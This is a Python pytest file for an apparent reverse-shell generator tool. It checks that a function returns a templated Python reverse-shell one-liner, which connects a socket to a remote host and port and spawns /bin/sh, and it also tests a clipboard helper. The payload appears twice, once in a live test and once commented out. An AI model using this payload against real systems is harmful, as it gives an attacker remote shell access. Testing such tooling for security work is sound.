import pyperclip
import pytest

from rst.lang_handler import provide_rs
from rst.lang_handler import python

# from pynput.keyboard import Key, Controller


def test_python_option():
    rs = r"""export RHOST="{}";export RPORT={};python -c \'import socket,os,pty;s=
        socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[
        os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'"""

    assert python(True) == rs


# @pytest.mark.parametrize(
#     ('steps','rs'),
#     (
#         pytest.param("")
#     ),
# )
# def test_python():
#     val = python()
#     keyboard = Controller()
#     keyboard.press(Key.enter)
#     keyboard.release(Key.enter)
#     rs = r'''export RHOST="{}";export RPORT={};python -c \'import socket,os,pty;s=
#         socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[
#         os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''''
#     assert val == rs


@pytest.mark.parametrize(
    ("rs", "ip", "port", "expected"),
    (("Something {} {}", "192", "1234", "Something 192 1234"),),
)
def test_rs_clipper(rs, ip, port, expected):
    provide_rs(rs, ip, port)
    assert expected == pyperclip.paste()
